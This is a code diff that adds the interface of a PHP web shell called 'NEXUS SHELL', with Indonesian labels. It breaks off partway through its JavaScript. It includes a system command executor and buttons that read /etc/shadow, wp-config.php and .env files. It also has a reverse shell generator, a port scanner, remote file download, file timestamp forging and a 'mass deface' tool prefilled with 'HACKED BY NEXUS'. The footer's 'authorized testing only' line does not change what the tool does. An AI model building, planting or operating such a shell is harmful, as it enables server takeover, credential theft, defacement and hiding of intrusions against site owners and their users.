+            background: rgba(15, 25, 45, 0.7);
+            backdrop-filter: blur(12px);
+            border-radius: 20px;
+            padding: 20px 28px;
+            margin-bottom: 24px;
+            border: 1px solid rgba(0, 150, 255, 0.2);
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+        }
+        .header h1 {
+            font-size: 28px;
+            font-weight: 700;
+            background: linear-gradient(135deg, #00ccff, #0066ff);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            letter-spacing: 1px;
+        }
+        .header .ver {
+            font-size: 12px;
+            color: #6688aa;
+            margin-top: 6px;
+        }
+        
+        /* User Info Bar */
+        .user-info-bar {
+            background: rgba(10, 20, 35, 0.7);
+            backdrop-filter: blur(8px);
+            border: 1px solid rgba(0, 150, 255, 0.2);
+            border-radius: 16px;
+            padding: 12px 20px;
+            margin-bottom: 24px;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-between;
+            align-items: center;
+            gap: 12px;
+            font-size: 13px;
+            font-weight: 500;
+        }
+        .user-info-bar .info {
+            color: #aaddff;
+        }
+        .user-info-bar .info i {
+            margin-right: 6px;
+            color: #00ccff;
+            width: 20px;
+        }
+        
+        /* Adminer Button */
+        .adminer-btn {
+            background: rgba(0, 150, 255, 0.15);
+            border: 1px solid rgba(0, 255, 136, 0.4);
+            border-radius: 10px;
+            padding: 6px 14px;
+            color: #00ff88;
+            cursor: pointer;
+            font-size: 12px;
+            transition: all 0.25s ease;
+            text-decoration: none;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            font-weight: 500;
+        }
+        .adminer-btn:hover {
+            background: rgba(0, 255, 136, 0.25);
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(0, 255, 136, 0.2);
+        }
+        .install-adminer {
+            background: rgba(255, 51, 102, 0.15);
+            border-color: #ff3366;
+            color: #ff6680;
+        }
+        .install-adminer:hover {
+            background: rgba(255, 51, 102, 0.25);
+        }
+        
+        /* Message */
+        .msg {
+            padding: 14px 20px;
+            border-radius: 14px;
+            margin-bottom: 24px;
+            text-align: center;
+            font-weight: 500;
+            font-size: 14px;
+            backdrop-filter: blur(4px);
+        }
+        .msg.success {
+            background: rgba(0, 255, 136, 0.12);
+            border: 1px solid #00ff88;
+            color: #00ff88;
+        }
+        .msg.error {
+            background: rgba(255, 51, 102, 0.12);
+            border: 1px solid #ff3366;
+            color: #ff6680;
+        }
+        
+        /* Navigation */
+        .nav {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin-bottom: 24px;
+            justify-content: center;
+        }
+        .nav-btn {
+            background: rgba(10, 30, 55, 0.6);
+            border: 1px solid rgba(0, 102, 255, 0.3);
+            border-radius: 40px;
+            padding: 8px 18px;
+            color: #88ccff;
+            text-decoration: none;
+            font-size: 13px;
+            font-weight: 500;
+            transition: all 0.25s ease;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            cursor: pointer;
+            backdrop-filter: blur(4px);
+        }
+        .nav-btn:hover {
+            background: rgba(0, 102, 255, 0.3);
+            color: white;
+            transform: translateY(-2px);
+            border-color: #00ccff;
+            box-shadow: 0 4px 12px rgba(0, 102, 255, 0.3);
+        }
+        
+        /* Path Bar */
+        .path {
+            background: rgba(0, 10, 20, 0.7);
+            backdrop-filter: blur(8px);
+            border-radius: 14px;
+            padding: 12px 18px;
+            margin-bottom: 24px;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            border-left: 4px solid #00ccff;
+            word-break: break-all;
+        }
+        .path a {
+            color: #88ccff;
+            text-decoration: none;
+            transition: color 0.2s;
+        }
+        .path a:hover {
+            color: #00ffcc;
+            text-decoration: underline;
+        }
+        .path-active {
+            float: right;
+            color: #00ff88;
+            font-size: 11px;
+        }
+        
+        /* Section */
+        .section {
+            background: rgba(10, 20, 40, 0.5);
+            backdrop-filter: blur(8px);
+            border-radius: 20px;
+            padding: 22px 24px;
+            margin-bottom: 24px;
+            border: 1px solid rgba(0, 102, 255, 0.2);
+            transition: all 0.3s ease;
+        }
+        .section:hover {
+            border-color: rgba(0, 150, 255, 0.4);
+            box-shadow: 0 4px 20px rgba(0, 100, 255, 0.1);
+        }
+        .section h3 {
+            color: #00ccff;
+            margin-bottom: 18px;
+            font-size: 18px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            border-left: 4px solid #00ccff;
+            padding-left: 14px;
+        }
+        
+        /* Command Buttons */
+        .cmd-buttons {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin-bottom: 18px;
+        }
+        .cmd-btn {
+            background: rgba(0, 102, 255, 0.12);
+            border: 1px solid rgba(0, 102, 255, 0.3);
+            border-radius: 40px;
+            padding: 7px 16px;
+            color: #88ccff;
+            cursor: pointer;
+            font-size: 12px;
+            font-weight: 500;
+            transition: all 0.2s ease;
+        }
+        .cmd-btn:hover {
+            background: rgba(0, 102, 255, 0.35);
+            color: white;
+            transform: scale(1.02);
+        }
+        
+        /* Form */
+        .form-row {
+            display: flex;
+            gap: 12px;
+            margin-bottom: 16px;
+            flex-wrap: wrap;
+            align-items: center;
+        }
+        .form-row input, .form-row select, .form-row textarea {
+            background: rgba(0, 15, 35, 0.8);
+            border: 1px solid rgba(0, 102, 255, 0.4);
+            border-radius: 12px;
+            padding: 12px 14px;
+            color: #ccf4ff;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+            flex: 1;
+            transition: all 0.2s;
+        }
+        .form-row input:focus, .form-row select:focus, .form-row textarea:focus {
+            outline: none;
+            border-color: #00ccff;
+            box-shadow: 0 0 0 3px rgba(0, 150, 255, 0.2);
+        }
+        .form-row textarea {
+            min-height: 100px;
+            resize: vertical;
+        }
+        
+        /* Buttons */
+        .btn {
+            background: linear-gradient(135deg, #0066ff, #00ccff);
+            border: none;
+            border-radius: 40px;
+            padding: 12px 24px;
+            color: white;
+            font-weight: 600;
+            font-size: 13px;
+            cursor: pointer;
+            transition: all 0.25s ease;
+        }
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(0, 102, 255, 0.4);
+        }
+        .btn-danger {
+            background: linear-gradient(135deg, #ff3366, #cc0033);
+        }
+        .btn-success {
+            background: linear-gradient(135deg, #00cc88, #00aa66);
+        }
+        
+        /* Table */
+        .table-wrapper {
+            overflow-x: auto;
+            border-radius: 16px;
+        }
+        .table {
+            width: 100%;
+            background: rgba(0, 15, 30, 0.4);
+            border-collapse: collapse;
+            font-size: 13px;
+        }
+        .table th, .table td {
+            padding: 14px 12px;
+            text-align: left;
+            border-bottom: 1px solid rgba(0, 102, 255, 0.2);
+        }
+        .table th {
+            background: rgba(0, 102, 255, 0.2);
+            color: #88ddff;
+            font-weight: 600;
+            font-size: 12px;
+            letter-spacing: 0.5px;
+        }
+        .table tr:hover td {
+            background: rgba(0, 102, 255, 0.08);
+        }
+        .table a {
+            color: #88ccff;
+            text-decoration: none;
+            margin: 0 6px;
+            display: inline-block;
+            transition: all 0.2s;
+        }
+        .table a:hover {
+            color: white;
+            transform: scale(1.05);
+        }
+        .action-icons {
+            white-space: nowrap;
+        }
+        
+        /* File Name Colors */
+        .writable-yes { color: #88ffaa; }
+        .writable-no { color: #ff8888; background: rgba(255, 51, 102, 0.12); border-radius: 6px; padding: 3px 8px; display: inline-block; font-weight: 500; }
+        .perm-red { color: #ff8888; font-weight: 600; }
+        .perm-green { color: #88ffaa; font-weight: 600; }
+        
+        /* Output */
+        .output {
+            background: #0a0e1a;
+            border-radius: 14px;
+            padding: 18px;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            overflow-x: auto;
+            white-space: pre-wrap;
+            max-height: 450px;
+            overflow-y: auto;
+            border: 1px solid rgba(0, 102, 255, 0.3);
+            margin-top: 16px;
+            line-height: 1.5;
+        }
+        
+        /* Grid */
+        .grid-2 {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(420px, 1fr));
+            gap: 24px;
+        }
+        
+        /* Modals */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.92);
+            backdrop-filter: blur(12px);
+            z-index: 10000;
+            align-items: center;
+            justify-content: center;
+        }
+        .modal-content {
+            background: linear-gradient(145deg, #0d1125, #0a0e1f);
+            border-radius: 28px;
+            width: 95%;
+            max-width: 1100px;
+            height: 85%;
+            max-height: 85vh;
+            padding: 28px;
+            border: 1px solid rgba(0, 150, 255, 0.3);
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.5);
+            display: flex;
+            flex-direction: column;
+        }
+        .modal-content h3 {
+            color: #00ccff;
+            margin-bottom: 18px;
+            font-size: 22px;
+            font-weight: 600;
+        }
+        .modal-content textarea {
+            width: 100%;
+            flex: 1;
+            padding: 18px;
+            margin: 12px 0;
+            background: #0a0e1a;
+            border: 1px solid rgba(0, 102, 255, 0.4);
+            border-radius: 16px;
+            color: #ccf4ff;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            line-height: 1.6;
+            resize: none;
+        }
+        .modal-buttons {
+            display: flex;
+            gap: 14px;
+            justify-content: flex-end;
+            margin-top: 18px;
+        }
+        .small-modal {
+            max-width: 500px !important;
+            height: auto !important;
+            max-height: 80vh !important;
+        }
+        
+        /* Scrollbar */
+        ::-webkit-scrollbar {
+            width: 8px;
+            height: 8px;
+        }
+        ::-webkit-scrollbar-track {
+            background: #0a0e1a;
+            border-radius: 10px;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #0066ff;
+            border-radius: 10px;
+        }
+        ::-webkit-scrollbar-thumb:hover {
+            background: #00ccff;
+        }
+        
+        /* Responsive */
+        @media (max-width: 768px) {
+            body { padding: 16px; }
+            .grid-2 { grid-template-columns: 1fr; }
+            .action-icons a { margin: 0 4px; font-size: 12px; }
+            .user-info-bar { flex-direction: column; text-align: center; }
+            .section { padding: 16px; }
+            .table th, .table td { padding: 10px 8px; }
+            .table td:nth-child(3), .table th:nth-child(3) { display: none; }
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    
+    <div class="header">
+        <h1><i class="fas fa-skull"></i> NEXUS SHELL</h1>
+        <div class="ver">v22.0 - ULTIMATE WEB SHELL | <a href="?logout=1" style="color:#ff6680; text-decoration:none; margin-left:12px;"><i class="fas fa-sign-out-alt"></i> Logout</a></div>
+    </div>
+    
+    <!-- USER INFO BAR -->
+    <div class="user-info-bar">
+        <div class="info">
+            <i class="fas fa-user"></i> <?php echo get_current_user(); ?> &nbsp;|&nbsp;
+            <i class="fas fa-id-card"></i> UID: <?php echo getmyuid(); ?> &nbsp;|&nbsp;
+            <i class="fas fa-users"></i> GID: <?php echo getmygid(); ?> &nbsp;|&nbsp;
+            <i class="fas fa-network-wired"></i> IP: <?php echo $_SERVER['REMOTE_ADDR']; ?>
+        </div>
+        <div>
+            <?php if (file_exists($current_dir . '/adminer.php')): ?>
+                <a href="adminer.php" target="_blank" class="adminer-btn"><i class="fas fa-database"></i> Adminer</a>
+                <a href="?delete=adminer.php&dir=<?php echo $dir_url; ?>" onclick="return confirm('Delete adminer.php?')" class="adminer-btn" style="border-color:#ff3366; color:#ff6680;"><i class="fas fa-trash"></i> Delete</a>
+            <?php else: ?>
+                <form method="post" style="display:inline;">
+                    <button type="submit" name="install_adminer" class="adminer-btn install-adminer"><i class="fas fa-download"></i> Install Adminer</button>
+                </form>
+            <?php endif; ?>
+        </div>
+    </div>
+    
+    <?php if ($msg): ?>
+    <div class="msg <?php echo $msg_type; ?>"><i class="fas fa-info-circle"></i> <?php echo htmlspecialchars($msg); ?></div>
+    <?php endif; ?>
+    
+    <!-- Navigation -->
+    <div class="nav">
+        <a href="?dir=<?php echo $dir_url; ?>" class="nav-btn"><i class="fas fa-sync-alt"></i> Refresh</a>
+        <a href="?dir=/" class="nav-btn"><i class="fas fa-root"></i> Root</a>
+        <a href="?dir=<?php echo urlencode($_SERVER['DOCUMENT_ROOT'] ?? '/'); ?>" class="nav-btn"><i class="fas fa-globe"></i> Webroot</a>
+        <a href="#" onclick="showModal('uploadModal')" class="nav-btn"><i class="fas fa-upload"></i> Upload</a>
+        <a href="#" onclick="showModal('createModal')" class="nav-btn"><i class="fas fa-plus"></i> Create</a>
+        <a href="#" onclick="showModal('wgetModal')" class="nav-btn"><i class="fas fa-download"></i> Wget/Curl</a>
+        <a href="#" onclick="showModal('unzipModal')" class="nav-btn"><i class="fas fa-file-archive"></i> Unzip</a>
+        <a href="#" onclick="showModal('massChmodFilesModal')" class="nav-btn"><i class="fas fa-file"></i> Chmod All</a>
+        <a href="#" onclick="showModal('massDefaceAllModal')" class="nav-btn"><i class="fas fa-skull"></i> Deface All</a>
+        <a href="#" onclick="toggleSection('reverseSection')" class="nav-btn"><i class="fas fa-network-wired"></i> Reverse</a>
+        <a href="#" onclick="toggleSection('userToolsSection')" class="nav-btn"><i class="fas fa-users"></i> User Tools</a>
+        <a href="#" onclick="toggleSection('portScanSection')" class="nav-btn"><i class="fas fa-search"></i> Port Scan</a>
+        <a href="#" onclick="toggleSection('configSection')" class="nav-btn"><i class="fas fa-key"></i> Config</a>
+    </div>
+    
+    <!-- Path -->
+    <div class="path">
+        <i class="fas fa-folder-open"></i> 
+        <?php
+        $parts = explode('/', trim($current_dir, '/'));
+        $p = '';
+        echo '<a href="?dir=/">/</a>';
+        foreach ($parts as $part) {
+            if (!$part) continue;
+            $p .= '/' . $part;
+            echo '<a href="?dir=' . urlencode($p) . '">' . htmlspecialchars($part) . '</a>/';
+        }
+        ?>
+        <span class="path-active"><i class="fas fa-location-dot"></i> <?php echo $current_dir; ?></span>
+    </div>
+    
+    <!-- CONFIG READER SECTION -->
+    <div id="configSection" class="section" style="display:none;">
+        <h3><i class="fas fa-key"></i> CONFIG READER</h3>
+        <div class="cmd-buttons">
+            <a href="?read_config=passwd&dir=<?php echo $dir_url; ?>" class="cmd-btn">📄 /etc/passwd</a>
+            <a href="?read_config=shadow&dir=<?php echo $dir_url; ?>" class="cmd-btn" style="border-color:#f0ad4e;">⚠️ /etc/shadow</a>
+            <a href="?read_config=hosts&dir=<?php echo $dir_url; ?>" class="cmd-btn">🌐 /etc/hosts</a>
+            <a href="?read_config=wp&dir=<?php echo $dir_url; ?>" class="cmd-btn">📝 wp-config.php</a>
+            <a href="?read_config=env&dir=<?php echo $dir_url; ?>" class="cmd-btn">🔧 .env</a>
+            <a href="?read_config=config_inc&dir=<?php echo $dir_url; ?>" class="cmd-btn">⚙️ config.inc.php</a>
+        </div>
+        <?php if ($config_content): ?>
+        <div class="output"><pre><?php echo htmlspecialchars($config_content); ?></pre></div>
+        <?php endif; ?>
+    </div>
+    
+    <!-- COMMAND SECTION -->
+    <div class="section">
+        <h3><i class="fas fa-terminal"></i> COMMAND EXECUTOR</h3>
+        <div class="cmd-buttons">
+            <button class="cmd-btn" onclick="setCmd('ls -la')">📂 ls -la</button>
+            <button class="cmd-btn" onclick="setCmd('pwd')">📁 pwd</button>
+            <button class="cmd-btn" onclick="setCmd('whoami')">👤 whoami</button>
+            <button class="cmd-btn" onclick="setCmd('id')">🆔 id</button>
+            <button class="cmd-btn" onclick="setCmd('uname -a')">💻 uname -a</button>
+            <button class="cmd-btn" onclick="setCmd('ps aux')">⚙️ ps aux</button>
+            <button class="cmd-btn" onclick="setCmd('netstat')">🌐 netstat</button>
+            <button class="cmd-btn" onclick="setCmd('ifconfig')">📡 ifconfig</button>
+            <button class="cmd-btn" onclick="setCmd('df -h')">💾 df -h</button>
+            <button class="cmd-btn" onclick="setCmd('free -m')">🧠 free -m</button>
+            <button class="cmd-btn" onclick="setCmd('wget https://github.com/kalcaddle/KODExplorer/archive/master.zip')">⬇️ wget</button>
+            <button class="cmd-btn" onclick="setCmd('unzip master.zip')">📦 unzip</button>
+        </div>
+        <div style="background:rgba(0, 150, 255, 0.08); border-radius: 12px; padding: 10px 14px; margin-bottom: 16px; font-size: 12px; border-left: 3px solid #00ccff;">
+            💡 <strong>wget [URL]</strong> - Download ke direktori aktif: <strong style="color:#00ff88;"><?php echo $current_dir; ?></strong><br>
+            💡 <strong>unzip [file.zip]</strong> - Extract file zip ke direktori aktif
+        </div>
+        <form method="post" class="form-row">
+            <input type="text" name="cmd" id="cmd_input" placeholder="Enter command..." value="<?php echo isset($_POST['cmd']) ? htmlspecialchars($_POST['cmd']) : ''; ?>">
+            <button type="submit" class="btn"><i class="fas fa-play"></i> RUN</button>
+        </form>
+        <?php if ($cmd_result): ?>
+        <div class="output"><pre><?php echo htmlspecialchars($cmd_result); ?></pre></div>
+        <?php endif; ?>
+    </div>
+    
+    <!-- PORT SCAN SECTION -->
+    <div id="portScanSection" class="section" style="display:none;">
+        <h3><i class="fas fa-search"></i> PORT SCANNER</h3>
+        <form method="post" class="form-row">
+            <input type="text" name="scan_host" placeholder="Target IP or Hostname" required value="127.0.0.1">
+            <input type="text" name="scan_ports" placeholder="Ports: 21,22,80,443 or 1-1000" value="21,22,80,443">
+            <button type="submit" name="port_scan" class="btn"><i class="fas fa-search"></i> SCAN</button>
+        </form>
+        <div class="cmd-buttons">
+            <button class="cmd-btn" onclick="setScanPorts('21,22,80,443')">🌐 Common Web Ports</button>
+            <button class="cmd-btn" onclick="setScanPorts('22')">🔑 SSH (22)</button>
+            <button class="cmd-btn" onclick="setScanPorts('3306')">🗄️ MySQL (3306)</button>
+            <button class="cmd-btn" onclick="setScanPorts('1-1000')">🔍 Range 1-1000</button>
+        </div>
+        <?php if ($scan_result): ?>
+        <div class="output"><pre><?php echo htmlspecialchars($scan_result); ?></pre></div>
+        <?php endif; ?>
+    </div>
+    
+    <!-- USER TOOLS SECTION -->
+    <div id="userToolsSection" class="section" style="display:none;">
+        <h3><i class="fas fa-users"></i> USER SCANNER</h3>
+        <form method="post">
+            <button type="submit" name="get_user_list" class="btn"><i class="fas fa-users"></i> Show All Users</button>
+        </form>
+        <?php if ($userlist_result): ?>
+        <div class="output"><pre><?php echo htmlspecialchars($userlist_result); ?></pre></div>
+        <?php endif; ?>
+    </div>
+    
+    <!-- REVERSE SHELL SECTION -->
+    <div id="reverseSection" class="section" style="display:none;">
+        <h3><i class="fas fa-network-wired"></i> REVERSE SHELL GENERATOR</h3>
+        <form method="post" class="form-row">
+            <input type="text" name="rev_ip" value="<?php echo $_SERVER['REMOTE_ADDR']; ?>" placeholder="Your IP">
+            <input type="text" name="rev_port" value="4444" placeholder="Port">
+            <select name="rev_type">
+                <option value="bash">Bash TCP</option>
+                <option value="nc">Netcat -e</option>
+                <option value="python">Python3</option>
+                <option value="php">PHP</option>
+                <option value="perl">Perl</option>
+            </select>
+            <button type="submit" name="gen_rev" class="btn"><i class="fas fa-code"></i> Generate</button>
+        </form>
+        <?php if ($rev_cmd): ?>
+        <div class="output"><pre><?php echo htmlspecialchars($rev_cmd); ?></pre></div>
+        <?php endif; ?>
+    </div>
+    
+    <!-- FILE MANAGER TABLE -->
+    <div class="section">
+        <h3><i class="fas fa-folder-tree"></i> FILE MANAGER <span style="font-size:11px; color:#ff8888; margin-left:10px;">(🔴 RED = Not Writable)</span></h3>
+        <div class="table-wrapper">
+            <table class="table">
+                <thead>
+                    <tr>
+                        <th style="width:38%">Name</th>
+                        <th style="width:10%">Size</th>
+                        <th style="width:17%">Modified</th>
+                        <th style="width:10%">Perms</th>
+                        <th style="width:25%">Actions</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <?php
+                    $items = @scandir($current_dir);
+                    if ($items) {
+                        $dirs = []; $files = [];
+                        foreach ($items as $item) {
+                            if ($item == '.') continue;
+                            $full = $current_dir . '/' . $item;
+                            if (is_dir($full)) $dirs[] = $item;
+                            else $files[] = $item;
+                        }
+                        sort($dirs);
+                        sort($files);
+                        $all = array_merge($dirs, $files);
+                        foreach ($all as $item) {
+                            $full = $current_dir . '/' . $item;
+                            $isDir = is_dir($full);
+                            $size = $isDir ? '<i class="fas fa-folder"></i>' : formatBytes(@filesize($full));
+                            $perms = getPermsStr($full);
+                            $modified = date("Y-m-d H:i:s", @filemtime($full));
+                            $enc = urlencode($item);
+                            $icon = getIcon($item, $isDir);
+                            $isWritable = is_writable($full);
+                            $writableClass = $isWritable ? 'writable-yes' : 'writable-no';
+                            $permClass = $isWritable ? 'perm-green' : 'perm-red';
+                            ?>
+                            <tr>
+                                <td><?php echo $icon; ?> 
+                                    <?php if ($isDir): ?>
+                                    <a href="?dir=<?php echo urlencode($full); ?>"><strong><?php echo htmlspecialchars($item); ?></strong></a>
+                                    <?php else: ?>
+                                    <span class="<?php echo $writableClass; ?>"><?php echo htmlspecialchars($item); ?></span>
+                                    <?php endif; ?>
+                                </td>
+                                <td><?php echo $size; ?></td>
+                                <td><?php echo $modified; ?></td>
+                                <td><span class="<?php echo $permClass; ?>"><?php echo $perms; ?></span></td>
+                                <td class="action-icons">
+                                    <?php if (!$isDir): ?>
+                                    <a href="#" onclick="editFile('<?php echo htmlspecialchars($item); ?>')" title="Edit"><i class="fas fa-edit"></i></a>
+                                    <a href="?download=<?php echo $enc; ?>&dir=<?php echo $dir_url; ?>" title="Download"><i class="fas fa-download"></i></a>
+                                    <?php endif; ?>
+                                    <a href="#" onclick="showRenameModal('<?php echo htmlspecialchars($item); ?>')" title="Rename"><i class="fas fa-i-cursor"></i></a>
+                                    <a href="#" onclick="showChmodModal('<?php echo htmlspecialchars($item); ?>', '<?php echo getPermNumber($full); ?>')" title="Chmod"><i class="fas fa-lock"></i></a>
+                                    <a href="#" onclick="showTouchModal('<?php echo htmlspecialchars($item); ?>', '<?php echo $modified; ?>')" title="Date"><i class="fas fa-calendar-alt"></i></a>
+                                    <a href="?delete=<?php echo $enc; ?>&dir=<?php echo $dir_url; ?>" onclick="return confirm('Delete <?php echo htmlspecialchars($item); ?>?')" title="Delete"><i class="fas fa-trash" style="color:#ff8888;"></i></a>
+                                    <?php if (!$isDir && pathinfo($item, PATHINFO_EXTENSION) == 'zip'): ?>
+                                    <a href="#" onclick="unzipFile('<?php echo htmlspecialchars($item); ?>')" title="Unzip"><i class="fas fa-file-archive" style="color:#88ffaa;"></i></a>
+                                    <?php endif; ?>
+                                </td>
+                            </tr>
+                            <?php
+                        }
+                    } else {
+                        echo '<tr><td colspan="5">Cannot read directory</td></tr>';
+                    }
+                    ?>
+                </tbody>
+            </table>
+        </div>
+    </div>
+    
+    <div class="section" style="text-align:center; margin-top:8px;">
+        <i class="fas fa-shield-haltered"></i> NEXUS SHELL | For authorized security testing only
+    </div>
+</div>
+
+<!-- MODALS -->
+<div id="uploadModal" class="modal"><div class="modal-content small-modal"><h3><i class="fas fa-upload"></i> Upload File</h3><form method="post" enctype="multipart/form-data"><input type="file" name="file" required><div class="modal-buttons"><button type="submit" class="btn">Upload</button><button type="button" class="btn btn-danger" onclick="closeModal('uploadModal')">Cancel</button></div></form><p style="font-size:11px; color:#88aaff; margin-top:12px;"><i class="fas fa-folder-open"></i> Akan disimpan ke: <strong><?php echo $current_dir; ?></strong></p></div></div>
+<div id="createModal" class="modal"><div class="modal-content small-modal"><h3><i class="fas fa-plus"></i> Create New</h3><form method="post"><input type="text" name="create_name" placeholder="File/Folder name" required><div class="modal-buttons"><button type="submit" name="create_file" class="btn">File</button><button type="submit" name="create_dir" class="btn">Folder</button><button type="button" class="btn btn-danger" onclick="closeModal('createModal')">Cancel</button></div></form></div></div>
+<div id="wgetModal" class="modal"><div class="modal-content small-modal"><h3><i class="fas fa-download"></i> Download with Wget/Curl</h3><form method="post"><input type="text" name="wget_url" placeholder="https://example.com/file.zip" required><input type="text" name="wget_name" placeholder="Custom filename (optional)"><div class="modal-buttons"><button type="submit" name="wget_url" class="btn">Download</button><button type="button" class="btn btn-danger" onclick="closeModal('wgetModal')">Cancel</button></div></form><p style="font-size:11px; color:#88aaff; margin-top:12px;"><i class="fas fa-folder-open"></i> Akan disimpan ke: <strong><?php echo $current_dir; ?></strong></p></div></div>
+<div id="unzipModal" class="modal"><div class="modal-content small-modal"><h3><i class="fas fa-file-archive"></i> Unzip File</h3><form method="post"><input type="text" name="unzip_file" placeholder="Nama file zip (contoh: master.zip)" required><div class="modal-buttons"><button type="submit" name="unzip_file" class="btn">Extract Here</button><button type="button" class="btn btn-danger" onclick="closeModal('unzipModal')">Cancel</button></div></form></div></div>
+<div id="massChmodFilesModal" class="modal"><div class="modal-content small-modal"><h3><i class="fas fa-file"></i> MASS CHMOD ALL FILES</h3><form method="post"><input type="text" name="mass_chmod_files_dir" value="<?php echo $current_dir; ?>" placeholder="Target Directory" required><input type="text" name="mass_chmod_files_perm" placeholder="Permission (644)" value="644"><label style="display:flex; align-items:center; gap:8px; margin:12px 0;"><input type="checkbox" name="mass_chmod_files_recursive"> Recursive (include subdirectories)</label><div class="modal-buttons"><button type="submit" name="mass_chmod_all_files_submit" class="btn">Apply Chmod</button><button type="button" class="btn btn-danger" onclick="closeModal('massChmodFilesModal')">Cancel</button></div></form><p style="font-size:11px; color:#88aaff; margin-top:12px;"><i class="fas fa-info-circle"></i> Akan mengubah permission SEMUA FILE menjadi 644</p></div></div>
+<div id="massDefaceAllModal" class="modal"><div class="modal-content small-modal"><h3><i class="fas fa-skull"></i> MASS DEFACE ALL FILES</h3><form method="post"><input type="text" name="deface_all_dir" value="<?php echo $current_dir; ?>" placeholder="Target Directory" required><textarea name="deface_all_content" placeholder="Content" rows="4">HACKED BY NEXUS</textarea><label style="display:flex; align-items:center; gap:8px; margin:12px 0;"><input type="checkbox" name="deface_all_recursive"> Recursive</label><div class="modal-buttons"><button type="submit" name="mass_deface_all_submit" class="btn btn-danger">START DEFACE</button><button type="button" class="btn btn-danger" onclick="closeModal('massDefaceAllModal')">Cancel</button></div></form><p style="font-size:11px; color:#ff8888; margin-top:12px;"><i class="fas fa-exclamation-triangle"></i> Akan mendeface file dengan extension: php, html, htm, txt, js, css, xml, json, sql, py, sh, cgi, pl</p></div></div>
+
+<!-- EDIT MODAL -->
+<div id="editModal" class="modal">
+    <div class="modal-content">
+        <h3><i class="fas fa-edit"></i> Edit File: <span id="editFileName" style="color:#88ffaa;"></span></h3>
+        <textarea id="editContent" spellcheck="false"></textarea>
+        <div class="modal-buttons">
+            <button onclick="saveEdit()" class="btn"><i class="fas fa-save"></i> Save</button>
+            <button onclick="closeModal('editModal')" class="btn btn-danger">Cancel</button>
+        </div>
+    </div>
+</div>
+
+<div id="renameModal" class="modal"><div class="modal-content small-modal"><h3><i class="fas fa-i-cursor"></i> Rename</h3><form method="post"><input type="hidden" name="rename_old" id="renameOld"><input type="text" name="rename_new" id="renameNew" placeholder="New name" required><div class="modal-buttons"><button type="submit" name="rename_submit" class="btn">Rename</button><button type="button" class="btn btn-danger" onclick="closeModal('renameModal')">Cancel</button></div></form></div></div>
+<div id="chmodModal" class="modal"><div class="modal-content small-modal"><h3><i class="fas fa-lock"></i> Single Chmod</h3><form method="post"><input type="hidden" name="chmod_file" id="chmodFile"><input type="text" name="chmod_perm" id="chmodPerm" placeholder="755, 644, 777" value="755" required><div class="modal-buttons"><button type="submit" name="chmod_submit" class="btn">Apply</button><button type="button" class="btn btn-danger" onclick="closeModal('chmodModal')">Cancel</button></div></form></div></div>
+<div id="touchModal" class="modal"><div class="modal-content small-modal"><h3><i class="fas fa-calendar-alt"></i> Change Modified Date</h3><form method="post"><input type="hidden" name="touch_file" id="touchFile"><input type="datetime-local" name="touch_datetime" id="touchDateTime" step="1" required><div class="modal-buttons"><button type="submit" name="touch_submit" class="btn">Change Date</button><button type="button" class="btn btn-danger" onclick="closeModal('touchModal')">Cancel</button></div></form></div></div>
+
+<script>
+function setCmd(cmd) {
+    document.getElementById('cmd_input').value = cmd;
+    document.getElementById('cmd_input').form.submit();
+}
+
+function setScanPorts(ports) {
+    let inputs = document.querySelectorAll('input[name="scan_ports"]');
+    if (inputs.length) inputs[inputs.length-1].value = ports;
+}
+
+function toggleSection(id) {
+    let el = document.getElementById(id);
+    if (el.style.display === 'none') el.style.display = 'block';
+    else el.style.display = 'none';
+}
+
+function showModal(id) {
+    document.getElementById(id).style.display = 'flex';
+}
+
+function closeModal(id) {
+    document.getElementById(id).style.display = 'none';
+}
+
+function showRenameModal(oldName) {
+    document.getElementById('renameOld').value = oldName;
+    document.getElementById('renameNew').value = oldName;
+    showModal('renameModal');
+}
+
+function showChmodModal(fileName, currentPerm) {
+    document.getElementById('chmodFile').value = fileName;
+    document.getElementById('chmodPerm').value = currentPerm || '755';
+    showModal('chmodModal');
+}
+
+function showTouchModal(fileName, currentDate) {
+    document.getElementById('touchFile').value = fileName;
+    let date = currentDate.replace(' ', 'T');
+    if (date.length > 16) date = date.substring(0, 16);
+    document.getElementById('touchDateTime').value = date;
+    showModal('touchModal');
+}
+
+function unzipFile(filename) {
+    document.querySelector('input[name="unzip_file"]').value = filename;
+    showModal('unzipModal');
+}
+
+function editFile(filename) {
+    document.getElementById('editFileName').innerText = filename;
+    document.getElementById('editContent').value = 'Loading...';
+    showModal('editModal');
+    
+    var xhr = new XMLHttpRequest();
+    xhr.open('GET', '?q=load&f=' + encodeURIComponent(filename) + '&dir=<?php echo $dir_url; ?>', true);
+    xhr.onload = function() {
+        if (xhr.status === 200) {
+            document.getElementById('editContent').value = xhr.responseText;
+        } else {
+            document.getElementById('editContent').value = 'Error loading file content!';
+        }
+    };
+    xhr.send();
+}
+
+function saveEdit() {
+    var filename = document.getElementById('editFileName').innerText;
+    var content = document.getElementById('editContent').value;
+    
+    var xhr = new XMLHttpRequest();
+    xhr.open('POST', '?dir=<?php echo $dir_url; ?>', true);
+    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+    xhr.onload = function() {
+        if (xhr.status === 200 && xhr.responseText === 'saved') {
+            alert('✅ File saved successfully!');
+            location.reload();
